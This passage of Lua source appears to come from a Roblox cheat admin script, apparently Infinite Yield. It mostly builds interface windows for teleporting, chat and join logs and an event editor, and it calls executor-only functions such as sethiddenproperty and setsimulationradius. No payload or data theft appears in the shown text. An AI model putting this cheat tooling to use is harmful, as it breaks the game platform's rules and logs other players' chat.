PluginsHint.TextSize = 16
PluginsHint.Text = "Download plugins from the IY Discord (discord.io/infiniteyield)"
PluginsHint.TextColor3 = Color3.new(1, 1, 1)
PluginsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
PluginsHint.TextWrapped = true
PluginsHint.ZIndex = 10
table.insert(text1,PluginsHint)

PositionsHint.Name = "PositionsHint"
PositionsHint.Parent = PositionsFrame
PositionsHint.BackgroundTransparency = 1
PositionsHint.BorderSizePixel = 0
PositionsHint.Position = UDim2.new(0, 25, 0, 40)
PositionsHint.Size = UDim2.new(0, 200, 0, 70)
PositionsHint.Font = Enum.Font.SourceSansItalic
PositionsHint.TextSize = 16
PositionsHint.Text = "Use the 'swp' or 'setwaypoint' command to add a position using your character (NOTE: Part teleports will not save)"
PositionsHint.TextColor3 = Color3.new(1, 1, 1)
PositionsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
PositionsHint.TextWrapped = true
PositionsHint.ZIndex = 10
table.insert(text1,PositionsHint)

ToPartFrame.Name = randomString()
ToPartFrame.Parent = PARENT
ToPartFrame.Active = true
ToPartFrame.BackgroundTransparency = 1
ToPartFrame.Position = UDim2.new(0.5, -180, 0, -500)
ToPartFrame.Size = UDim2.new(0, 360, 0, 20)
ToPartFrame.ZIndex = 10

background_5.Name = "background"
background_5.Parent = ToPartFrame
background_5.Active = true
background_5.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
background_5.BorderSizePixel = 0
background_5.Position = UDim2.new(0, 0, 0, 20)
background_5.Size = UDim2.new(0, 360, 0, 117)
background_5.ZIndex = 10
table.insert(shade1,background_5)

ChoosePart.Name = "ChoosePart"
ChoosePart.Parent = background_5
ChoosePart.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
ChoosePart.BorderSizePixel = 0
ChoosePart.Position = UDim2.new(0, 100, 0, 55)
ChoosePart.Size = UDim2.new(0, 75, 0, 30)
ChoosePart.Font = Enum.Font.SourceSans
ChoosePart.TextSize = 14
ChoosePart.Text = "Select Part"
ChoosePart.TextColor3 = Color3.new(1, 1, 1)
ChoosePart.ZIndex = 10
table.insert(shade2,ChoosePart)
table.insert(text1,ChoosePart)

CopyPath.Name = "CopyPath"
CopyPath.Parent = background_5
CopyPath.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
CopyPath.BorderSizePixel = 0
CopyPath.Position = UDim2.new(0, 185, 0, 55)
CopyPath.Size = UDim2.new(0, 75, 0, 30)
CopyPath.Font = Enum.Font.SourceSans
CopyPath.TextSize = 14
CopyPath.Text = "Copy Path"
CopyPath.TextColor3 = Color3.new(1, 1, 1)
CopyPath.ZIndex = 10
table.insert(shade2,CopyPath)
table.insert(text1,CopyPath)

Directions_4.Name = "Directions"
Directions_4.Parent = background_5
Directions_4.BackgroundTransparency = 1
Directions_4.BorderSizePixel = 0
Directions_4.Position = UDim2.new(0, 51, 0, 17)
Directions_4.Size = UDim2.new(0, 257, 0, 32)
Directions_4.Font = Enum.Font.SourceSans
Directions_4.TextSize = 14
Directions_4.Text = 'Click on a part and then click the "Select Part" button below to set it as a teleport location'
Directions_4.TextColor3 = Color3.new(1, 1, 1)
Directions_4.TextWrapped = true
Directions_4.TextYAlignment = Enum.TextYAlignment.Top
Directions_4.ZIndex = 10
table.insert(text1,Directions_4)

Path.Name = "Path"
Path.Parent = background_5
Path.BackgroundTransparency = 1
Path.BorderSizePixel = 0
Path.Position = UDim2.new(0, 0, 0, 94)
Path.Size = UDim2.new(0, 360, 0, 16)
Path.Font = Enum.Font.SourceSansItalic
Path.TextSize = 14
Path.Text = ""
Path.TextColor3 = Color3.new(1, 1, 1)
Path.TextScaled = true
Path.TextWrapped = true
Path.TextYAlignment = Enum.TextYAlignment.Top
Path.ZIndex = 10
table.insert(text1,Path)

shadow_4.Name = "shadow"
shadow_4.Parent = ToPartFrame
shadow_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
shadow_4.BorderSizePixel = 0
shadow_4.Size = UDim2.new(0, 360, 0, 20)
shadow_4.ZIndex = 10
table.insert(shade2,shadow_4)

PopupText_5.Name = "PopupText"
PopupText_5.Parent = shadow_4
PopupText_5.BackgroundTransparency = 1
PopupText_5.Size = UDim2.new(1, 0, 0.95, 0)
PopupText_5.ZIndex = 10
PopupText_5.Font = Enum.Font.SourceSans
PopupText_5.TextSize = 14
PopupText_5.Text = "Teleport to Part"
PopupText_5.TextColor3 = Color3.new(1, 1, 1)
PopupText_5.TextWrapped = true
table.insert(text1,PopupText_5)

Exit_4.Name = "Exit"
Exit_4.Parent = shadow_4
Exit_4.BackgroundTransparency = 1
Exit_4.Position = UDim2.new(1, -20, 0, 0)
Exit_4.Size = UDim2.new(0, 20, 0, 20)
Exit_4.Text = ""
Exit_4.ZIndex = 10

ExitImage_5.Parent = Exit_4
ExitImage_5.BackgroundColor3 = Color3.new(1, 1, 1)
ExitImage_5.BackgroundTransparency = 1
ExitImage_5.Position = UDim2.new(0, 5, 0, 5)
ExitImage_5.Size = UDim2.new(0, 10, 0, 10)
ExitImage_5.Image = "rbxassetid://5054663650"
ExitImage_5.ZIndex = 10

logs.Name = randomString()
logs.Parent = PARENT
logs.Active = true
logs.BackgroundTransparency = 1
logs.Position = UDim2.new(0, 0, 1, 10)
logs.Size = UDim2.new(0, 338, 0, 20)
logs.ZIndex = 10

shadow.Name = "shadow"
shadow.Parent = logs
shadow.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 338, 0, 20)
shadow.ZIndex = 10
table.insert(shade2,shadow)

Hide.Name = "Hide"
Hide.Parent = shadow
Hide.BackgroundTransparency = 1
Hide.Position = UDim2.new(1, -40, 0, 0)
Hide.Size = UDim2.new(0, 20, 0, 20)
Hide.ZIndex = 10
Hide.Text = ""

ImageLabel.Parent = Hide
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0, 3, 0, 3)
ImageLabel.Size = UDim2.new(0, 14, 0, 14)
ImageLabel.Image = "rbxassetid://2406617031"
ImageLabel.ZIndex = 10

PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Size = UDim2.new(1, 0, 0.949999988, 0)
PopupText.ZIndex = 10
PopupText.Font = Enum.Font.SourceSans
PopupText.FontSize = Enum.FontSize.Size14
PopupText.Text = "Logs"
PopupText.TextColor3 = Color3.new(1, 1, 1)
PopupText.TextWrapped = true
table.insert(text1,PopupText)

Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundTransparency = 1
Exit.Position = UDim2.new(1, -20, 0, 0)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.ZIndex = 10
Exit.Text = ""

ImageLabel_2.Parent = Exit
ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel_2.BackgroundTransparency = 1
ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
ImageLabel_2.Size = UDim2.new(0, 10, 0, 10)
ImageLabel_2.Image = "rbxassetid://5054663650"
ImageLabel_2.ZIndex = 10

background.Name = "background"
background.Parent = logs
background.Active = true
background.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
background.BorderSizePixel = 0
background.ClipsDescendants = true
background.Position = UDim2.new(0, 0, 1, 0)
background.Size = UDim2.new(0, 338, 0, 245)
background.ZIndex = 10

chat.Name = "chat"
chat.Parent = background
chat.Active = true
chat.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
chat.BorderSizePixel = 0
chat.ClipsDescendants = true
chat.Size = UDim2.new(0, 338, 0, 245)
chat.ZIndex = 10
table.insert(shade1,chat)

Clear.Name = "Clear"
Clear.Parent = chat
Clear.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0, 5, 0, 220)
Clear.Size = UDim2.new(0, 50, 0, 20)
Clear.ZIndex = 10
Clear.Font = Enum.Font.SourceSans
Clear.FontSize = Enum.FontSize.Size14
Clear.Text = "Clear"
Clear.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2,Clear)
table.insert(text1,Clear)

SaveChatlogs.Name = "SaveChatlogs"
SaveChatlogs.Parent = chat
SaveChatlogs.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
SaveChatlogs.BorderSizePixel = 0
SaveChatlogs.Position = UDim2.new(0, 258, 0, 220)
SaveChatlogs.Size = UDim2.new(0, 75, 0, 20)
SaveChatlogs.ZIndex = 10
SaveChatlogs.Font = Enum.Font.SourceSans
SaveChatlogs.FontSize = Enum.FontSize.Size14
SaveChatlogs.Text = "Save To .txt"
SaveChatlogs.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2,SaveChatlogs)
table.insert(text1,SaveChatlogs)

Toggle.Name = "Toggle"
Toggle.Parent = chat
Toggle.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
Toggle.BorderSizePixel = 0
Toggle.Position = UDim2.new(0, 60, 0, 220)
Toggle.Size = UDim2.new(0, 66, 0, 20)
Toggle.ZIndex = 10
Toggle.Font = Enum.Font.SourceSans
Toggle.FontSize = Enum.FontSize.Size14
Toggle.Text = "Disabled"
Toggle.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2,Toggle)
table.insert(text1,Toggle)

scroll_2.Name = "scroll"
scroll_2.Parent = chat
scroll_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
scroll_2.BorderSizePixel = 0
scroll_2.Position = UDim2.new(0, 5, 0, 25)
scroll_2.Size = UDim2.new(0, 328, 0, 190)
scroll_2.ZIndex = 10
scroll_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll_2.ScrollBarThickness = 8
scroll_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
table.insert(scroll,scroll_2)
table.insert(shade2,scroll_2)

join.Name = "join"
join.Parent = background
join.Active = true
join.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
join.BorderSizePixel = 0
join.ClipsDescendants = true
join.Size = UDim2.new(0, 338, 0, 245)
join.Visible = false
join.ZIndex = 10
table.insert(shade1,join)

Toggle_2.Name = "Toggle"
Toggle_2.Parent = join
Toggle_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
Toggle_2.BorderSizePixel = 0
Toggle_2.Position = UDim2.new(0, 60, 0, 220)
Toggle_2.Size = UDim2.new(0, 66, 0, 20)
Toggle_2.ZIndex = 10
Toggle_2.Font = Enum.Font.SourceSans
Toggle_2.FontSize = Enum.FontSize.Size14
Toggle_2.Text = "Disabled"
Toggle_2.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2,Toggle_2)
table.insert(text1,Toggle_2)

Clear_2.Name = "Clear"
Clear_2.Parent = join
Clear_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
Clear_2.BorderSizePixel = 0
Clear_2.Position = UDim2.new(0, 5, 0, 220)
Clear_2.Size = UDim2.new(0, 50, 0, 20)
Clear_2.ZIndex = 10
Clear_2.Font = Enum.Font.SourceSans
Clear_2.FontSize = Enum.FontSize.Size14
Clear_2.Text = "Clear"
Clear_2.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2,Clear_2)
table.insert(text1,Clear_2)

scroll_3.Name = "scroll"
scroll_3.Parent = join
scroll_3.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
scroll_3.BorderSizePixel = 0
scroll_3.Position = UDim2.new(0, 5, 0, 25)
scroll_3.Size = UDim2.new(0, 328, 0, 190)
scroll_3.ZIndex = 10
scroll_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll_3.ScrollBarThickness = 8
scroll_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
table.insert(scroll,scroll_3)
table.insert(shade2,scroll_3)

selectChat.Name = "selectChat"
selectChat.Parent = background
selectChat.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
selectChat.BorderSizePixel = 0
selectChat.Position = UDim2.new(0, 5, 0, 5)
selectChat.Size = UDim2.new(0, 164, 0, 20)
selectChat.ZIndex = 10
selectChat.Font = Enum.Font.SourceSans
selectChat.FontSize = Enum.FontSize.Size14
selectChat.Text = "Chat Logs"
selectChat.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade2,selectChat)
table.insert(text1,selectChat)

selectJoin.Name = "selectJoin"
selectJoin.Parent = background
selectJoin.BackgroundColor3 = Color3.new(0.305882, 0.305882, 0.309804)
selectJoin.BorderSizePixel = 0
selectJoin.Position = UDim2.new(0, 169, 0, 5)
selectJoin.Size = UDim2.new(0, 164, 0, 20)
selectJoin.ZIndex = 10
selectJoin.Font = Enum.Font.SourceSans
selectJoin.FontSize = Enum.FontSize.Size14
selectJoin.Text = "Join Logs"
selectJoin.TextColor3 = Color3.new(1, 1, 1)
table.insert(shade3,selectJoin)
table.insert(text1,selectJoin)

function create(data)
	local insts = {}
	for i,v in pairs(data) do insts[v[1]] = Instance.new(v[2]) end

	for _,v in pairs(data) do
		for prop,val in pairs(v[3]) do
			if type(val) == "table" then
				insts[v[1]][prop] = insts[val[1]]
			else
				insts[v[1]][prop] = val
			end
		end
	end

	return insts[1]
end

ViewportTextBox = (function()
	local textService = game:GetService("TextService")

	local funcs = {}
	funcs.Update = function(self)
		local cursorPos = self.TextBox.CursorPosition
		local text = self.TextBox.Text
		if text == "" then self.TextBox.Position = UDim2.new(0,2,0,0) return end
		if cursorPos == -1 then return end

		local cursorText = text:sub(1,cursorPos-1)
		local pos = nil
		local leftEnd = -self.TextBox.Position.X.Offset
		local rightEnd = leftEnd + self.View.AbsoluteSize.X

		local totalTextSize = textService:GetTextSize(text,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X
		local cursorTextSize = textService:GetTextSize(cursorText,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X

		if cursorTextSize > rightEnd then
			pos = math.max(-2,cursorTextSize - self.View.AbsoluteSize.X + 2)
		elseif cursorTextSize < leftEnd then
			pos = math.max(-2,cursorTextSize-2)
		elseif totalTextSize < rightEnd then
			pos = math.max(-2,totalTextSize - self.View.AbsoluteSize.X + 2)
		end

		if pos then
			self.TextBox.Position = UDim2.new(0,-pos,0,0)
			self.TextBox.Size = UDim2.new(1,pos,1,0)
		end
	end

	local mt = {}
	mt.__index = funcs

	local function convert(textbox)
		local obj = setmetatable({OffsetX = 0, TextBox = textbox},mt)

		local view = Instance.new("Frame")
		view.BackgroundTransparency = textbox.BackgroundTransparency
		view.BackgroundColor3 = textbox.BackgroundColor3
		view.BorderSizePixel = textbox.BorderSizePixel
		view.BorderColor3 = textbox.BorderColor3
		view.Position = textbox.Position
		view.Size = textbox.Size
		view.ClipsDescendants = true
		view.Name = textbox.Name
		view.ZIndex = 10
		textbox.BackgroundTransparency = 1
		textbox.Position = UDim2.new(0,4,0,0)
		textbox.Size = UDim2.new(1,-8,1,0)
		textbox.TextXAlignment = Enum.TextXAlignment.Left
		textbox.Name = "Input"
		table.insert(text1,textbox)
		table.insert(shade2,view)

		obj.View = view

		textbox.Changed:Connect(function(prop)
			if prop == "Text" or prop == "CursorPosition" or prop == "AbsoluteSize" then
				obj:Update()
			end
		end)

		obj:Update()

		view.Parent = textbox.Parent
		textbox.Parent = view

		return obj
	end

	return {convert = convert}
end)()

ViewportTextBox.convert(Cmdbar).View.ZIndex = 10
ViewportTextBox.convert(Cmdbar_2).View.ZIndex = 10

IYMouse = Players.LocalPlayer:GetMouse()
UserInputService = game:GetService("UserInputService")

local sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
local gethidden = gethiddenproperty or get_hidden_property or get_hidden_prop
local setsimulation = setsimulationradius or set_simulation_radius

function writefileExploit()
	if writefile then
		return true
	end
end

function isNumber(str)
	if tonumber(str) ~= nil or str == 'inf' then
		return true
	end
end

function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

function tools(plr)
	if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
		return true
	end
end

function r15(plr)
	if plr.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
		return true
	end
end

function toClipboard(String)
	local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	if clipBoard then
		clipBoard(String)
		notify('Clipboard','Copied to clipboard')
	else
		notify('Clipboard',"Your exploit doesn't have the ability to use the clipboard")
	end
end

function getHierarchy(obj)
	local fullname
	local period

	if string.find(obj.Name,' ') then
		fullname = '["'..obj.Name..'"]'
		period = false
	else
		fullname = obj.Name
		period = true
	end

	local getS = obj
	local parent = obj
	local service = ''

	if getS.Parent ~= game then
		repeat
			getS = getS.Parent
			service = getS.ClassName
		until getS.Parent == game
	end

	if parent.Parent ~= getS then
		repeat
			parent = parent.Parent
			if string.find(tostring(parent),' ') then
				if period then
					fullname = '["'..parent.Name..'"].'..fullname
				else
					fullname = '["'..parent.Name..'"]'..fullname
				end
				period = false
			else
				if period then
					fullname = parent.Name..'.'..fullname
				else
					fullname = parent.Name..''..fullname
				end
				period = true
			end
		until parent.Parent == getS
	elseif string.find(tostring(parent),' ') then
		fullname = '["'..parent.Name..'"]'
		period = false
	end

	if period then
		return 'game:GetService("'..service..'").'..fullname
	else
		return 'game:GetService("'..service..'")'..fullname
	end
end

AllWaypoints = {}

local cooldown = false
function writefileCooldown(name,data)
	spawn(function()
		if not cooldown then
			cooldown = true
			writefile(name, data)
		else
			repeat wait() until cooldown == false
			writefileCooldown(name,data)
		end
		wait(3)
		cooldown = false
	end)
end

function dragGUI(gui)
	spawn(function()
		local dragging
		local dragInput
		local dragStart = Vector3.new(0,0,0)
		local startPos
		local function update(input)
			local delta = input.Position - dragStart
			local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
		end
		gui.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = gui.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)
		gui.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)
	end)
end

dragGUI(logs)
dragGUI(KeybindEditor)
dragGUI(PluginEditor)
dragGUI(ToPartFrame)

eventEditor = (function()
	local events = {}

	local function registerEvent(name,sets)
		events[name] = {
			commands = {},
			sets = sets or {}
		}
	end

	local onEdited = nil

	local function fireEvent(name,...)
		local args = {...}
		local event = events[name]
		if event then
			for i,cmd in pairs(event.commands) do
				local metCondition = true
				for idx,set in pairs(event.sets) do
					local argVal = args[idx]
					local cmdSet = cmd[2][idx]
					local condType = set.Type
					if condType == "Player" then
						if cmdSet == 0 then
							metCondition = metCondition and (tostring(Players.LocalPlayer) == argVal)
						elseif cmdSet ~= 1 then
							metCondition = metCondition and table.find(getPlayer(cmdSet,Players.LocalPlayer),argVal)
						end
					elseif condType == "String" then
						if cmdSet ~= 0 then
							metCondition = metCondition and string.find(argVal:lower(),cmdSet:lower())
						end
					elseif condType == "Number" then
						if cmdSet ~= 0 then
							metCondition = metCondition and tonumber(argVal)<=tonumber(cmdSet)
						end
					end
					if not metCondition then break end
				end

				if metCondition then
					pcall(coroutine.wrap(function()
						local cmdStr = cmd[1]
						for count,arg in pairs(args) do
							cmdStr = cmdStr:gsub("%$"..count,arg)
						end
						wait(cmd[3] or 0)
						execCmd(cmdStr)
					end))
				end
			end
		end
	end

	local main = create({
		{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderSizePixel=0,Name="EventEditor",Position=UDim2.new(0.5,-175,0,-500),Size=UDim2.new(0,350,0,20),ZIndex=10,}},
		{2,"Frame",{BackgroundColor3=currentShade2,BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
		{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0.95,0),Text="Event Editor",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=Enum.TextXAlignment.Center,ZIndex=10,}},
		{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
		{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
		{6,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,202),ZIndex=10,}},
		{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={6},Position=UDim2.new(0,5,0,5),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,-10,1,-10),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
		{8,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={7},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
		{9,"UIListLayout",{Parent={8},SortOrder=2,}},
		{10,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,ClipsDescendants=true,Name="Settings",Parent={6},Position=UDim2.new(1,0,0,0),Size=UDim2.new(0,150,1,0),ZIndex=10,}},
		{11,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),Name="Slider",Parent={10},Position=UDim2.new(0,-150,0,0),Size=UDim2.new(1,0,1,0),ZIndex=10,}},
		{12,"Frame",{BackgroundColor3=Color3.new(0.23529413342476,0.23529413342476,0.23529413342476),BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,Name="Line",Parent={11},Size=UDim2.new(0,1,1,0),ZIndex=10,}},
		{13,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={11},Position=UDim2.new(0,0,0,25),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,-25),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
		{14,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={13},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
		{15,"UIListLayout",{Parent={14},SortOrder=2,}},
		{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={11},Size=UDim2.new(1,0,0,20),Text="Event Settings",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
		{17,"TextButton",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Font=3,Name="Close",BorderSizePixel=0,Parent={11},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="<",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
		{18,"Folder",{Name="Templates",Parent={10},}},
		{19,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Players",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,86),Visible=false,ZIndex=10,}},
		{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={19},Size=UDim2.new(1,0,0,20),Text="Choose Players",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
		{21,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={19},Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-10,0,20),Text="Any Player",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{22,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={21},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
		{23,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={22},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
		{24,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Me",Parent={19},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Me Only",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{25,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={24},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
		{26,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={25},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
		{27,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={19},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Custom Player Set",Position=UDim2.new(0,5,0,64),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{28,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={19},Position=UDim2.new(1,-25,0,64),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
		{29,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={28},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
		{30,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Strings",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
		{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={30},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
		{32,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={30},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any String",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
		{33,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={32},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
